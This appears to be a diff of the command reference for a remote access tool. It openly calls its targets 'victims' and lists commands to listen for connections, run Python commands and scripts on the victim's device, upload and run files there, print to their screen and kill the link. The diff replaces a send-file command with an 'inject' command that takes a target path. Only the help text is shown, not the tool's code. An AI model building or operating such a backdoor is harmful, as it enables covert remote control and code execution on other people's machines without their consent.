@@ -2,28 +2,31 @@
 
     -= Commands =-
 
- - @HELP, ::?                                               | Provides a list of commands.
-                                                            |
- - @GO, ::!                                                 | Starts listening for a connecion.
-                                                            |
- - @PRINT, ::p <message>                                    | Prints something to the victim's 
-                                                            | screen.
-                                                            |
- - @PYTHON, ::py <command>                                  | Executes a Python command on the 
-                                                            | victim's device.
-                                                            |
- - @PYSCRIPT, ::py-s [(-a, --abspath)] <path>               | Executes a Python script at the 
-                                                            | provided path on the victim's device, 
-                                                            | '-a' and '--abspath' indicates that
-                                                            | you're inputting an absolute path.
-                                                            |
- - @SENDFILE, ::sf [(-a, --abspath), (-r, --run)] <path>    | Sends a file to the client and 
-                                                            | downloads it onto the victims device,
-                                                            | '-r' and '--run' will run the file
-                                                            | after the file is fully downloaded,
-                                                            | once again, '-a' and '--abspath' will
-                                                            | indicate that an absolute path will be
-                                                            | given.
-                                                            |
- - @KILL, ::k                                               | Kills the connection.
+ - @HELP, ::?                                                                      | Provides a list of commands.
+                                                                                   |
+ - @GO, ::!                                                                        | Starts listening for a connecion.
+                                                                                   |
+ - @TERMINATE, ::t                                                                 | Terminates the program.
+                                                                                   |
+ - @PRINT, ::p <message>                                                           | Prints something to the victim's 
+                                                                                   | screen.
+                                                                                   |
+ - @PYTHON, ::py <command>                                                         | Executes a Python command on the 
+                                                                                   | victim's device.
+                                                                                   |
+ - @PYSCRIPT, ::py-s [(-a, --abspath)] <path>                                      | Executes a Python script at the 
+                                                                                   | provided path on the victim's device, 
+                                                                                   | '-a' and '--abspath' indicates that
+                                                                                   | you're inputting an absolute path.
+                                                                                   |
+ - @INJECT, ::i [(-a, --abspath), (-r, --run), (-t, --target <path>)] <path>       | Sends a file or directory to the client 
+                                                                                   | and uploads it to the victims device,
+                                                                                   | '-r' and '--run' will run the file
+                                                                                   | after the file is fully downloaded,
+                                                                                   | '-t' and '--target' will define a
+                                                                                   | destination path, and once again, '-a'
+                                                                                   | and '--abspath' will indicate that an
+                                                                                   | absolute path will be given.
+                                                                                   |
+ - @KILL, ::k                                                                      | Kills the connection.
 
